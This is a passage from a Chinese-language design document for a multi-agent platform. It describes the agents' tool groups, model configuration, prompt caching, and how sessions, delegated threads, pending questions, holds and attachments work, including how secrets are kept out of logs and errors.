  - `memory`：`memory_edit` 改自己的记忆，`memory_edit_public` 改全局记忆（语义同 `edit_skill`：`old_text` 恰好出现一次时替换为 `new_text`，为空时追加；管理类工具，base 没有；改的人记为那个 agent），超长时报错（`InvalidInput`）告诉模型至少要腾出多少字。工具的领域错误一律先 `ModelRetry` 交还模型修正；同一工具连续失败用完重试预算（`TOOL_MAX_RETRIES`）后改为 `ToolFailed`，模型看到失败结果、换做法或跳过这步，不终止整轮运行（`DomainErrorsAsRetry`）。所以工具拒绝调用一律抛 `DomainError`（参数矛盾 `InvalidInput`、对象不存在 `NotFound` 等），不自己抛 `ModelRetry`，否则绕过这层、连续 3 次就让整轮失败（tests/test_boundaries.py 静态检查）；MCP server 拒绝调用（`MCPToolset` 报的 `ModelRetry`）也在 `mcp._SecretSafe` 换成 `InvalidInput`，MCP 工具的重试预算同为 `TOOL_MAX_RETRIES`；只有 pydantic 参数校验失败仍按重试上限终止。
  - `skills`：`read_skill`（任何存在的 skill 都读得到：没分给它的照常返回并注明不在它的 skill 索引里——软隔离；结果里给出只读的生成目录）/ `write_skill` / `edit_skill`（两者都可带 `attachments_dir` 整体替换附件，见第 1 节「skill 的生成目录」；edit 改正文的一部分：替换恰好出现一次的片段，或追加；这条规则只在 `platform.text_edit.edit` 写一次，skill 正文与 `edit_file` 共用；可选 `description` 同时或单独改描述，一次提交；什么都不改是错误，规则在 `SkillStore.edit`）/ `delete_skill`。新建的归调用者；改、删已有的按规则 2（owner 或 admin）。
  - `agents`：`list_agents`（能委派的 agent，按分组列 name、description）/ `get_agent` / `create_agent` / `update_agent`（只改给出的字段，可以改自己）/ `delete_agent`（不能删除自己），`create_role` / `update_role`（只改给出的字段；allow / deny 整体替换）/ `delete_role`，`transfer_item`（把 skill / MCP / secret 转给某个 agent 或平台，`ItemCatalog.transfer_item`；kind 参数只接受这三种）。agent 只有名称、描述、模型、思考档位、分发规则（`roles` / `allow` / `deny`）；`get_agent` 给出它最终能用的工具与条目（`kind:name`）、全部角色（含固定规则）与全部内置工具；新建的 agent 记忆为空，角色写在描述里（它出现在 agent 自己的运行上下文里，也是委派时选人的依据）。
  - `delegation`：`delegate_task` / `ask_agent` / `list_threads` / `stop_thread`（停止一个 thread：结束它正在进行的运行、清空它的信箱）（按名称指定目标 agent、按 agent + thread 名指定子会话，见第 7 节）。阻塞 / 非阻塞的参数语义（#217）：阻塞（调用不返回、一直等：`ask_agent`、`run_shell` 前台）必填 `timeout`，无上限、模型自己估；非阻塞（发起后与 agent 并发：`delegate_task(report_back)`、`run_shell(background)`）没有 timeout，有 `heartbeat_seconds`（默认 30，`sessions.work.DEFAULT_CHECK_SECONDS` 一处）；参数用错场合（后台传 timeout、前台或不 report_back 时传 heartbeat）以告诉正确用法的 `InvalidInput` 交还模型。`ask_user` 等的是用户，不算任务，没有 timeout。 目标可以是自己（#183）：一次性、可并行的杂活（审查、抓取总结、拆开并行的几部分）就 `ask_agent` / `delegate_task` 给自己开新 thread——它是自己的一个新会话，带着自己的记忆、skill 与工具，上下文不进发起的会话。以前的临时 agent（`run_temp_agent`）因此删除：它以发起方身份运行、回答交回发起方，本来就等于给自己开一个新会话，却要另维护一套工具组合、工作目录与无会话的运行路径。
  - `wakeup`：`wake_me`（到点唤醒这个会话，会话等待的一种，见第 7 节「到点唤醒」；`sessions/wakeup_tools.py`）。
  - `notify`：`notify_user`（显式 Web Push）。
  - `mcp_admin`：`mcp_list`（它能用的 server，含停用的，标明是否是自己的）/ `mcp_add`（写入前按添加者能用的 secret 实际连接并列出工具，连接失败直接把错误还给 agent；新建的归调用者）/ `mcp_remove`（规则 2）。启停只在界面上。改动从下一次运行起生效。
  - `vault`：`vault_list`（它能用的 key，标明是否是自己的）/ `vault_set`（新建归调用者，改已有的按规则 2）/ `vault_delete`。没有读取明文的工具；`vault_set` 的 value 参数在消息落库和推送到前端前被替换为 `[redacted]`，参数校验失败时交还模型的错误（`RetryPromptPart` 里 pydantic 错误的 `input`，缺字段时就是整个参数）同样替换；重试用完时运行失败的 `UnexpectedModelBehavior` 去掉挂着校验错误的异常链再抛出（`redaction.tool_input_kept_out_of_failures`），日志的 traceback 里也没有参数原文（`agent_runtime/redaction.py`；要脱敏的工具参数由定义这些工具的 agents 声明为 `agents.api.SECRET_TOOL_ARGS`（`agents/secret_tools.py`），tests/test_tool_schemas.py 断言它们在注册的工具 schema 里存在）。
  - `triggers`：`trigger_kinds` / `trigger_list(finished?)` / `trigger_create(name, kind, prompt, config, agent?)` / `trigger_update` / `trigger_run` / `trigger_delete`，一组工具覆盖所有触发方式，差异只在 `kind` 与 `config`。agent 同样按名称指定；`trigger_list(finished=true)` 列已结束的（跑完的一次性触发器），只能看不能改。webhook 的 token 只能由用户在界面上生成，agent 拿不到也不需要。
  - `issues`：`issue_list` / `issue_show` / `issue_create` / `issue_update` / `issue_comment` / `issue_stop`（见第 21 节）。
  - `web`：`web_search(query, limit)` / `web_fetch(url)`，经 `muliao.web.provider.WebProvider`（网页领域 `web/`，工具组在 `web/tools.py`） 完成；具体服务由配置 `[web]` 的 `type` 选择（现有 `deepseek`，即 DeepSeek 的 Search / Fetch API），新增一种服务 = 一个实现加一个 `type`。query 长度、条数上限、URL 规则以服务端校验为准，不在本地重复：服务端按错误契约拒绝（400/403/404/413，以及 fetch 带错误体的 408/504，即目标站点抓取超时）作为可纠正的错误交还模型；限流、其余超时与 5xx（含不带错误体的网关 504）是暂时性失败，按运行失败统一重试；key 无效、余额不足等配置问题让运行失败。fetch 的 404（"failed to fetch URL"）只说明服务没拿到内容，不说明页面不存在（实测 raw.githubusercontent.com 的纯文本文件服务都抓不到，#189），所以这时直接 GET 一次（带 UA、整段限时 20 秒、最多读 2MB）：拿到纯文本类型（text/* 除 HTML、JSON、XML、YAML 等）原样返回并注明是直连；HTML 不在本地转 Markdown；其余情况（直连非 200、非纯文本、连不上）把服务与直连两边的原因一起交还模型。抓取的正文按 `runtime.tool_output_max_chars` 截断。没配置 `[web]` 时不注册这两个工具，规则里的 `tool:web_*` 不放行任何工具，不影响启动。
  - `mcp`：该 agent 能用的（自己的与规则分给它的）、已启用的 MCP server（`McpRegistry.index`），以 `<server名>_` 为工具前缀。实现是 pydantic-ai 的 `DynamicToolset`，每次运行按当时的配置构建（配置归 agent 领域 `agents/mcp.py` 的 `McpRegistry`，与 skill、memory 一样是带版本的资源；把配置连接成工具归运行时 `agent_runtime/mcp.py` 的 `McpConnector.toolset`，新增时的连接验证 `probe` 由组合根注入给配置），所以改动从下一次运行起生效；stdio server 的进程在这次运行的工作目录里启动（它写出的文件，如浏览器的页面快照，落在 agent 的文件工具与 shell 读得到的地方；新增时的探测沿用服务进程的目录），工具交回的图片存成文件引用（见第 7 节「附件与文件」）；配置只有一个类型（`McpConfig`，存储的配置缺字段直接报错，不补默认值）。配置中的 `${vault:KEY}` 在运行时按正在用它的 agent 能用的 secret 解析（分发 server 的角色要同时收录它引用的 secret；添加时的探测按添加者，用户能用全部），引用用不了的 key 时这个 server 这次不可用。**一个 server 出问题只影响它自己**：引用的 secret 不在了、连不上（`mcp._Reachable` 逐个连接），这次运行就没有它的工具，其余 server 照常可用；原因打 warning 日志，并作为 `RunScope.notices` 接在这次运行的运行上下文后面告诉模型（见第 6 节「运行上下文」）。暂时性的连接失败也是跳过，不再让整次运行失败重试。运行中调用工具时 server 出错（非暂时性）只是这次调用失败：以 `ToolFailed` 交还模型，由它换个做法（暂时性失败仍让运行按 `TransientError` 重试）；运行结束断开连接失败只记 warning，不让已经做完的运行失败。连接、列工具、调用工具失败时异常文本可能带着代入后的 secret（如 SSE 传输的 HTTP 错误带完整 URL），运行期（连接、列工具、调用、断开）与添加时的探测都经 `mcp._SecretSafe.guard` 换成脱敏后的 `McpFailed`（暂时性失败仍是 `TransientError`；异常组展开子异常），不带原始异常链，tasks.error、日志与探测结果里都没有明文；交还模型的错误只脱敏信息（`ToolFailed` 保留类型，`ModelRetry` 换成 `InvalidInput`，见上文 `memory` 一项）。secret 每次构建只解析一次，代入配置与脱敏用同一份。HTTP 客户端（httpx/httpx2）逐请求的 INFO 日志带完整 URL，`logging_setup` 把它们调到 WARNING。
- **model**：agent 的 `model` 字段格式为 `<provider 名>:<模型名>`，provider 在配置文件 `[llm.providers.<名>]` 中定义（类型、api_key、base_url）。`llm.ModelRegistry` 是唯一按配置构造模型的地方，每个 provider 复用一个客户端；每种类型怎么接（官方地址、客户端、模型、模型名查询）在 `llm.KINDS` 里各登记一行（`ProviderKind`），不按类型分支。API key 与 base_url 只来自配置：base_url 未填时显式传入该类型的官方地址，不让 SDK 回退到 `*_BASE_URL` 环境变量。SDK 仍可能读取少数无法通过参数关闭的环境变量（如 `OPENAI_ORG_ID`、自定义请求头），launchd 服务只设置 `PATH`，不会带入这些变量。界面上选模型时，provider 下拉框来自配置（`GET /api/providers`），模型名由 `ModelRegistry.list_models` 向该 provider 实时查询（`GET /api/providers/{name}/models`，即各家的 models 接口），不维护本地模型清单；查询失败返回 502 并带上原因，不用猜测的列表兜底。
- **prompt caching**：`type = "anthropic"` 的 provider 默认开启 Anthropic 的 prompt caching（`llm.ANTHROPIC_CACHE_SETTINGS`，作为 `AnthropicModel` 的默认 settings，运行时不再逐次合并）。缓存断点放在每次请求都原样重发的前缀上：指令（含全局记忆、记忆、skill 目录）、工具定义、消息末尾，共三个，不超过 Anthropic 一次请求最多 4 个的上限。这三个断点要起作用，前缀必须逐字节稳定：指令里不放随运行变化的值（当前时间等走运行上下文，见第 6 节），已经保存的消息不再修改。用逐块的 `anthropic_cache_messages` 而不是服务端自动放断点的 `anthropic_cache`：这个类型也用于 Anthropic 兼容的网关，它们不一定支持顶层的自动缓存参数。配置里 `prompt_cache = false` 可以关掉（不发送任何缓存设置）；它只对这个类型有意义，填在别的类型上直接报错而不是静默忽略。缓存命中与写入的 token 记在用量里（第 19 节）。
- **思考档位**（#171）：agent 的 `thinking` 字段（`agents.service.Thinking`：`default` / `off` / `low` / `medium` / `high` / `xhigh`，存 agents.thinking）。`default` 什么都不传，与没有这个字段时一样；其余作为运行级 `ModelSettings.thinking`（`off` 为 False）交给 pydantic_ai，由它换算成各 provider 的参数（Anthropic 的 adaptive + effort、OpenAI 的 reasoning effort），平台不做厂商映射。运行级设置由 pydantic_ai 合并在模型自带的 settings（prompt caching）之上，键不重叠。会话运行与压缩都经 `AgentRuntime._model` 取模型与设置。pydantic_ai 按模型 profile 判为不支持的档位（profile 不支持思考；总在思考的模型上的 `off`）只会被它悄悄丢掉，平台在写入时、启动检查时（`ModelRegistry.check`）与运行前（`llm.check_thinking`）报错，不让设置看似生效。profile 按 provider 类型与模型名推断：经 OpenAI 兼容接口接入的 deepseek 被当作 OpenAI 模型，判为不支持。

## 7. 会话领域

**职责**：会话、thread 树、信箱、历史、挂起的调用、运行（消费者与逐步保存）、压缩、停止、删除、会话种类的规则。会话 actor（lane）是运行的串行边界，会话领域的一个本地事务是状态的一致性边界。对外接口在 `sessions/api.py`，发布的事件与接收的定向命令在 `sessions/events.py`。

### 会话种类

会话的行为差别只在 `sessions/kinds.py` 定义一处（`KindPolicy`），别处读策略，不按种类分支：

| 种类 | 由谁开出 | 私有 | 用户能写 | 列在会话列表、运行失败通知用户 | 归父会话所有（随它删除、不能单独删除） | 回答交给 | 续聊用 |
|---|---|---|---|---|---|---|---|
| `conversation` | 用户、触发器 | 否 | 是 | 是 | 否 | 用户（在等时） | — |
| `thread` | `delegate_task` | 否 | 是 | 是 | 否 | 用户（在等时）；`report_back` 交回父会话 | `delegate_task` |
| `private_thread` | `ask_agent` | 是 | 否（只读） | 否（从父会话进入） | 是 | 发问的 agent（作为 `ask_agent` 的结果） | `ask_agent` |

thread 种类只由委派创建（`origin` 为 delegation，带父会话，`KindPolicy.opened_by_delegation`），新建会话时检查种类与来源一致；按发送方定位会话只在顶层种类里找（`kinds.TOP_LEVEL`）。「私有」（只有开它的会话能继续，`list_threads` 与界面据此标出）与「用户能写」是两条规则，碰巧对同一种类成立。会话接口随会话下发 `user_writable`、`deletable` 与 `private`，界面不另写一份规则。续聊工具名与工具注册共用常量（`kinds.DELEGATE_TASK`、`deferred.ASK_AGENT`），tests/test_tool_schemas.py 断言它们都已注册。

会话列表（`SessionService.list`）把工作状态不是 idle 的会话置顶（在符合筛选的全部会话里算，不只这一页，所以第一页就含全部进行中的会话；代价是每个会话读一条最后的消息，看有没有挂起的提问；10-22 实测 259 个会话约 10ms，会话 id 进 `IN (...)`，到上万个会话会碰到 SQLite 的参数上限，那时改成先按 lane 上的任务、占用与最后一条回复找候选再算），其余按最近更新排序；列表接口的每一行（`SessionListItem`）带工作状态 `state`（`SessionActivity` 的同一条规则，见下文「工作状态」；与置顶是同一次计算），界面据此标记「运行中」（转圈）或「等待中」（沙漏）；按 agent 分组时，不空闲的会话单独成一个「进行中」区，置于所有 agent 分组之上（带 agent 名），其余会话再按 agent 分组。运行开始与结束都有 task 事件，列表据此重新拉取。筛选（`directory.Listing`）：按 agent、来源（界面的分类 tab：全部 / 对话 / issue / 自动任务）、发送方身份，以及关键字 `q`（#254：标题或任一条消息的可搜索文字含有它，`LIKE` 子串匹配，`%`、`_` 按字面，不区分 ASCII 大小写）。可搜索文字（`history.searchable_text`）是从消息派生的索引表 `message_texts`（归 history 子域，写消息时同一事务写入，随消息级联删除）：用户消息（不含运行上下文）、文字回复、工具调用的工具名与参数的字符串值；不含工具结果（占消息文字的三分之二以上，搜什么都命中）、思考和 JSON 的键名结构。不直接 LIKE 消息 JSON：键名让常见英文词命中几乎所有会话，工具参数是二次编码的 JSON 字符串，含引号的搜不到，且要扫 174MB。10-27 实测索引文字 20MB、全扫约 30ms（在全局事务锁内；搜索框非空时 task 事件会触发重新拉取），到百毫秒级再把它换成 FTS5 trigram。

**工作状态**（`activity.work_states_in`，唯一规则；会话列表、issue 看板、定时触发避免重叠、`list_threads` 与委派的运行中检查都用它）：`running` 会话的 lane 上有排队或进行中的任务，或有投给它、还没投递的 `Receive`；`waiting` 运行停了但在等外面的结果——有 active 占用（后台任务、委派出去的工作、到点唤醒）或还能回答的 ask_user 提问；否则 `idle`。running 与 waiting 都是「事情还没做完」：等待中的会话结果回来会自动接着做，所以除了展示，各处只区分 idle 与否。批量计算，查询次数与会话数无关（列表一次几百个，事务持有全局写锁）；挂起的提问只可能在最后一条模型回复里（之前每条回复的调用在下一条回复前都已有结果），所以只读最后一条回复起的消息（`history.since_last_response`），不加载整段上下文。它与删除检查回答不同的问题：挂起的提问没有人在外面做事，不挡删除；删除检查同样批量查（lane 与 active 占用各一次）。挂起的调用（`pending.pending_in`、唤醒的 `wake_in`）也同理只读最后一条回复起的消息；需要整段上下文的只有消费者与停止。

### thread 与结果路由

agent 之间的委派有两种形态，都是「往某个 thread 的信箱投一封信」，thread 由自己的消费者经 worker 运行：

| 工具 | 父 agent | 子 session | 处理它的运行的回答 |
|---|---|---|---|
| `delegate_task(agent, task, thread)` | 立即继续，不等 | 公开 thread：进会话页「对话」，用户可追问 | 推送给用户；父 agent 拿不到 |
| `delegate_task(..., report_back=true)` | 立即继续，不等 | 同上 | 不直接推送，作为事件交回父会话（第 8 节） |
| `ask_agent(agent, message, thread)` | 停在这次调用上等回信（见「挂起的调用」） | 私有 thread：不进会话页「对话」，用户只读 | 作为这次调用的结果交回父 agent |

**界面上 thread 显示在开出或续写它的那次调用处**：哪次调用开出或续写了哪个 thread 是会话领域自己的一份记录（`thread_calls` 表，`sessions/thread_calls.py`，按「父会话 + 调用 id」唯一，随父会话或 thread 删除），在开出/续写 thread 的同一个事务里写下（`Threads.send` / `Threads.dispatch`，调用 id 取 `ctx.tool_call_id`；续写同一个 thread 时每次调用各一行，续跑重新执行同一次调用不重复记）。会话接口（`SessionService.detail`）按调用 id 给调用条目挂上 thread（`transcript.annotate_threads`，历史与实时快照都挂），父会话页把 thread 显示在那次调用的过程组下方，而不是统一列在会话末尾（那会让早先的 thread 看起来属于最新的对话）。关联只看调用 id，不看调用有没有结果、结果是谁产出的：工具自己的结果、停止补的、中断补的、没等到回答就继续的（STILL_WORKING）都一样，以后新增的结果路径也不用补记。工具结果上不再带 thread（#251 之前记在结果 metadata 的 `muliao_threads` 上，非工具产出的结果都没有，要逐条路径补；迁移已从它与委派记录回填，旧消息里的这项不再读）。之后经 SSE 收到的调用条目不挂：那时 thread 列表也还没重新拉取，下一步保存（`saved` 事件）或运行一停就重新拉取。thread 只由这两处开出（`create_session` 只许委派建 thread），所以没有任何调用条目引用的 thread 只剩 #251 回填也找不到调用的早期数据，列在末尾「未关联到调用的 thread」。调用条目上的 thread 与 thread 列表在同一次读取里给出，关联又随 thread 删除，所以调用条目引用的 thread 一定在列表里（前端拿不到就报错）。

- **thread**：父 session 内对子 session 的具名引用（`sessions.parent_session_id` + `agent_id` + `thread`，唯一索引 `uq_sessions_thread`；#217 之前只按父 session + 名字唯一，给不同 agent 用同名会报错）。模型只用 agent 名 + thread 名，不接触 session id。同一个 agent 同名即续聊，对方的上下文保留（例如审查 → 修改 → 再审查）。thread 的种类在创建时确定，用错工具续聊时以可纠正的错误交还模型（`KindPolicy.continued_by`）。`stop_thread` 只给名字时，这个名字只有一个 thread 就停它，有几个（不同 agent）就报错要求带 `agent`。
- **推送按信件、不按 session**：每封信件带「用户是否在等它的回答」（`awaited`，由投信的入口设置，见第 14 节）。一次运行处理过的信件里有用户在等的，就把它的回答推送给用户；否则不推，agent 可以自己 `notify_user`。同一个公开 thread 里，父 agent 委派的任务与用户的追问都推送；`report_back` 的委派不推送，结果交回父 agent。
- **回答交给谁**（`platform.tooling.Audience`，工具的共同契约，不入库，`KindPolicy.audience`）：运行开始时由会话种类与它处理的信件推导一次，决定 `ask_user` 能否调用与运行上下文里怎么说（它随运行变化，所以在运行上下文里而不是 instructions 里，见第 6 节）：私有 thread 是 `agent`；处理过的和信箱里排着的信件有用户在等就是 `user`；否则 `none`。运行中途才到的、用户在等的消息会被这次运行处理、收尾时推送，但这次运行的工具与指令不随之改变（工具集在 pydantic-ai 运行开始时固定）；提问要等下一次运行。
- **私有 thread** 有自己的信箱和消费者，可以开后台任务、`report_back`、被停止（发问方那次调用拿到「被停止」）。`ask_user` 在私有 thread 里调用会被拒绝（没有用户在等）；拒绝说明会告诉它这是另一个 agent 在问：自己决定，或把需要对方定的问题写进最终回答交回发起方（对方可在同一个 thread 里回复），不提通知用户。
- **删除**（`deletion.delete_sessions`，删会话与删 agent 唯一的规则）：一个事务删除会话与（逐层）归它所有的私有 thread；公开 thread 保留（`parent_session_id` 置空）。任一被删会话忙时拒绝（判断只看会话自己的数据，无异步窗口）。交给被删会话、还没结清的关联以「被删除」结清并交回发起方；它自己发起的委派（占用）随它删除，之后 thread 的结局没有收件人。发布 `SessionDeleted`，其他领域各自清理引用它的数据（指向它的通知）；job 行保留终态。

### 占用与结清

**占用**（`sessions/holds.py`）：别的领域为某个会话开始一项异步工作时，在会话上登记一个占用（不透明的 holder：后台任务 `job:<id>`，委派 `delegation:<发起会话>:<工具调用 id>`，会话自己约的到点唤醒 `wake:<会话>:<工具调用 id>`）。会话只知道「有人替我在外面做事」，不知道是什么事。占用行永久保留，带状态：

| 状态 | 含义 |
|---|---|
| `active` | 工作还在进行：会话不算做完，交给它的委派不结清；会话算忙，不能删除 |
| `released` | 结局已经交回（和一封信件同一事务，`work.deliver_in`） |
| `cleared` | 工作被放弃（会话被停止，或会话自己放弃：改期、取消到点唤醒，`holds.abandon`）：之后才到的结局一律不投 |

占用可以带 `call_id`：这项工作的结局要作为那次挂起调用的结果交回（`ask_agent`）。**「这次调用已经交出去」= 本会话有带这个 `call_id` 的占用，不论状态**，是永久事实（`holds.called_in`）。

**交回结局**（`work.deliver_in`，唯一出口）：一项占用的结局交回会话（后台任务经 `WorkEnded`，委派由 thread 结清时在同一事务里），和释放占用同一个事务：发起方还停在这项占用对应的挂起调用上 → 一封回答信件，作为调用的结果交回；否则 → 一封事件信件（来源如 `thread:<子会话>`、`job:<id>`）。占用已 `cleared` → 不投（`DROPPED`）；会话已删除 → `GONE`。「迟到的回答改为事件」只在这里。按幂等键去重，重放只投一次。

**运行中检查（心跳）**（`mailbox.post_check_in`）：`platform.checks.WorkWatcher` 只管节拍，每 `TICK_SECONDS`（1 秒）让后台任务与委派各自看哪些到期了；间隔的规则（默认值 `DEFAULT_CHECK_SECONDS`、到期 `check_due`）在会话领域 `sessions/work.py`，工作区经 `sessions.api` 用。每项并发工作按发起时的 `heartbeat_seconds`（存在 `jobs.check_seconds` / `delegations.check_seconds`）从开始或上一次检查起计（上一次的时刻只在进程内记，重启后从开始时刻重算），到期就向发起会话投一封检查信件（不推送），信里写明可选的动作（继续等、没事只回「…」、用哪个工具停）与下一次检查的间隔；同一来源已有信件在信箱里排着时不再发，占用已不是 active 时不投，事件不会在等回答时堆积。不需要了就 `job_kill` 或 `stop_thread`。检查信件显式标记（`mail.check_in`，交给模型时记进 `RUN_CHECK_INS`），界面据此把同一来源连续的检查（连同 agent 只回的「…」）合成一行「仍在进行 · 已检查 N 次」，不靠匹配文字。

**到点唤醒**（`wake_me`，`sessions/wakeups.py` 与 `sessions/wakeup_tools.py`，表 `wakeups`，#261）：会话等待的一种，与后台任务、委派同类。会话约一个时刻（`at` 本地时间或 `after_seconds`）和一句给到点的自己的说明（`note`），登记一个占用（`wake:<会话>:<调用 id>`，按调用 id 幂等）：之后会话的工作状态是 waiting——issue 不算停滞、运行结束不被请表态，委派来的工作也不结清（它还没做完）。`WakeUps` 是 `WorkWatcher` 的又一种工作，每拍查占用还 active、`due_at` 已到的唤醒，经 `deliver_in` 投一封事件信件（来源 `wake_me`，带约的时刻与说明）并释放占用，会话接着做。到没到点只看库里的 `due_at` 与占用状态，重启不丢。一个会话至多一个还在等的唤醒：再约就取代（旧占用 `abandon` 为 cleared），`cancel` 取消；用户停止会话时占用随别的一起被清掉，到点不投。它和别的 active 占用一样挡删除：约了将来要做的事，删除前先停止，表示确认放弃（占用不透明，删除检查不分辨种类）。外部事件不另做工具：能用脚本轮询的，用后台任务跑检查循环、满足即退出；只能隔段时间看一眼的用 `wake_me`（取代原来「约一个 once 触发器到点回 issue 留言」的用法）。

**关联与结清**（`sessions/settlement.py`）：委派来的信件带关联 id（它的 holder）。会话自己判断关联什么时候结束，在同一个事务里把结局交回发起方（第 8 节），时机只有下面几个，每个时机一个入口（结清哪些信件只在 settlement 里决定，调用方不传状态集合）：

- **完成**：运行结束的事务里（`sessions.finish`），运行正常结束、没有停在挂起的调用上、信箱里没有还要交给模型的信件、没有 active 占用 → 会话内已处理、还未结清的全部关联以 `finished` 结清，带回答与文件（`settle_finished_in`）。占用释放总是伴随一封信件，信件会唤醒下一次运行，结清由那次运行结束时判断。
- **最终失败**：队列记失败的事务里（`RunHandler.failed_in`），会话内已处理、还未结清的全部关联，加上交给过这次运行、还排着的（运行在第一次保存之前就失败时，开头取走的信件一直排着，它们不会再唤醒运行，`runs.handed_to`；它们随之记为被丢弃），以 `failed` 结清（`settle_failure_in`）；同一个事务里接着 `wake_in`：运行开始之后才到的信件（如对同一 thread 的第二项委派）当场唤醒下一次运行，不等对账；并发布 `RunFailed`（带会话来源，订阅方按来源认领，如 issue 看板在时间线记一笔，第 21 节；通知领域据此通知用户）。按会话范围而不是按处理它的运行，所以早先停在 `ask_user` 上的运行处理过的委派、被续跑接管的信件都包括在内。`failed_in` 自己失败时（worker 不带钩子记下失败），由信箱对账（`sessions/reconcile.py` 的 `MailReconciler` 调 `reconcile_failures`）以同一个函数补做，每个会话一个事务。
- **停止 / 删除**：未结清的关联（排着的与已处理的）以 `stopped` / `deleted` 结清（`settle_stopped_in` 随后清空信箱 / `settle_deleted_in`）。

`mail.correlation_settled` 保证每个关联只结清一次，交回与结清、占用的释放在同一个事务里，所以每项委派的结局只交回一次（第 8 节）。

**发布的事件**：

| 事件 | 时机 | 订阅者 |
|---|---|---|
| `RunEnded` | 运行结束（完成、挂起、停止；没有可交给模型的空闲收尾不发），带会话来源 | 通知（推送）、issue（issue 会话结束时请停滞的 agent 表态，单条 lane 串行） |
| `RunFailed` | 运行最终失败（`RunHandler.failed_in`） | 通知（列出的会话）、issue（issue 会话的时间线） |
| `SessionStopped` | 停止事务，带被清掉的占用 | 后台任务 |
| `SessionRead` | 用户打开会话（会话的未读就是指向它的未读通知） | 通知（指向它的通知已读） |
| `SessionDeleted` | 删除，每个被删会话一条 | 通知 |
| `AgentSessionsCleared` | 删除 agent 的流程里，它的会话已全部删除 | agent |

接收的定向命令：`WorkEnded` / `WorkCheckIn`（后台任务的结局与运行中检查，来源与幂等键由会话领域按占用者推出）、`Receive`（触发器的来信）、`StopThread`（自己发给自己：停止委派出去的 thread）。

### 挂起的调用（`ask_user` 与 `ask_agent`，`sessions/pending.py`）

两者是同一件事：**模型调用了一个要等别人回信的工具**。工具调用 `defer_call()`（agent_runtime），这次运行停在这里正常结束，不占 worker、不在 worker 里等。回信是一封回答信件（`MailKind.ANSWER`，`tool_call_id →` 带工具名的结果信封 `{"tool": "ask_user" | "ask_agent", "result": …}`，读的一方按 `tool` 区分，不按形状），消费者开始下一次运行时把它作为那次调用的结果交回（`run_steps` 的 `deferred`），模型看到的就是「我问了，对方这样答」。

两者的差别只写在一张表里（`sessions/deferred.py` 的 `DeferredTool`），各处查表，不按工具名分支；工具注册时显式用表里的名字：

| 工具 | 要占用才算挂起（`needs_hold`） | 没交出去时可原样重放（`replayable`） | 停止时仍挂着（`kept_open_on_stop`） | 调用里给用户的问题（`questions`） | 没等到回答就继续时的结果（`skipped_result`） |
|---|---|---|---|---|---|
| `ask_user` | 否 | 否（没结果的总是挂着） | 是 | `questions_of` | 没回答 / 跳过 |
| `ask_agent` | 是 | 是 | 否 | 无 | `STILL_WORKING` |

- **哪些调用还挂着**由历史推导（`pending_calls`），不另存状态：没有结果的 `ask_user` 调用等用户；没有结果、并且已经交出去（本会话有带它的调用 id 的占用）的 `ask_agent` 调用等 agent（没有占用的不算挂着：回复保存后、投递提交前失败，它是待执行的调用，续跑时再执行——这一步里还有别的没出结果的调用时整步都不重放，见「从哪里开始」）。「调用是否已有结果」只在 `sessions.conventions.unanswered_calls` 定义一处，参数被拒绝、交还模型重试的调用也算有结果。挂起的调用只可能在历史末尾：之后的运行都会先关闭它们。
- **什么时候继续**（`waiting`，唯一规则）：用户发了新消息（跳过还没回答的），或挂起的调用都有了回答；事件（检查、完成通知）留在信箱里，等它们一起交给模型。唤醒（`mailbox.wake_in`）与消费者开头共用这一条。
- **跳过**：pydantic-ai 拒绝在未处理的调用后追加新消息，所以用户发了新消息时，没回答的 `ask_user` 显式记为「用户没回答、发了新消息」（同一次提交里回答了别的提问时记为跳过），还没回答的 `ask_agent` 记为「它还在处理，回答会作为事件送达」（`STILL_WORKING`）——那时它已不再挂着，委派的结局按事件投回（第 8 节）。结果随那一步保存。
- **迟到的回答**：回答投信之后、交给模型之前，调用可能已被另一次运行关闭（用户先发了消息）。这时回答作为一段用户消息交给模型（`pending.late_text`），不丢、也不让运行卡住。
- **续跑**：`ask_agent` 被重新执行（续跑那一步）时按调用 id 幂等（`Threads.dispatch` 的 holder 由调用 id 派生），已经投过就只再挂起，不重复投信。

**`ask_user`**：做法同 Claude Code 的 AskUserQuestion、Codex 的提问：一次 1 到 4 个选择题（单选或多选，每题 2 到 6 个选项），界面上每题总能在「其他」里自己写。工具总是列出，只在 `Audience.USER` 时可用，否则抛领域错误交还模型，说明按 Audience 区分（`agent`：另一个 agent 在问，把要对方定的写进回答；`none`：自己决定、必要时 `notify_user`）（`sessions/ask_user.py` 的 `REJECTED`；不用 `prepare` 隐藏，以免工具列表随运行变化破坏 prompt 缓存）。

- 运行停在提问上时通知用户「等你回答：…」。
- 界面把回答随消息提交（`answers: {tool_call_id: [每题的回答]}`，可以没有文字），`inbound.receive` 校验它针对现在能回答的提问（`pending.open_asks_of`，加载在 `mailbox.open_asks_in`：还挂着、也还没有回答在信箱里排着的），选项属于该题、单选至多一个、每题都有选择或「其他」，然后把交给模型的结果（`AskResult`：`answered` 加每题的选择，或没回答时的说明）存在回答信件里。回答交给模型之前一直排着（运行失败重试时也还在），所以不需要别的条件。
- 展示：提问不收进过程组。每个 `ask_user` 条目的状态由后端按唯一规则给出（`transcript.annotate_asks`，会话接口与实时条目共用投影）：`asking`（运行还没停下）、`pending`（显示表单）、`submitted`（回答已提交、还排着，回答显示在信箱里）、`answered`（显示问题与选择）、`not_answered`；被退回的调用（参数被工具 schema 拒绝，或没有用户在等这次运行的回答）不是提问，按普通工具错误展示。前端不解析工具结果文本。

### 附件与文件

做法同主流 IM 的媒体仓库（Matrix media repository、Slack files）：先上传得到 id，消息里只放引用。

- **上传**：`POST /api/files?name=<名称>`，请求体就是文件内容，`Content-Type` 是它的类型（同 Matrix `/media/upload`，不用 multipart），边读边写边算 sha256，超过 `runtime.upload_max_bytes`（默认 50MB）立即停止。名称必须是单个路径段，不合法直接拒绝，不做修正。发消息时 `attachments` 带上 id（可以只有附件没有文字），`inbound.receive` 校验它们存在，记在消息信件上。
- **在消息里的两种形态**（`agent_runtime/attachments.py`）：存储形态是 `UserPromptPart` 里的 `ImageUrl` / `DocumentUrl`，url 即文件引用，数据库、界面、重放都用它；每次模型请求前由 pydantic-ai 的 `before_model_request` 钩子（`AttachmentsForModel`）展开成模型形态：一段说明（名称、类型、大小、工作目录里的路径），可内联的图片（png/jpeg/gif/webp）再附上内容。展开只替换这一次请求的消息列表，持久化的历史不变，所以文件内容在数据库里没有副本。模型不支持图片时，provider 的报错让运行失败，不悄悄丢掉图片。
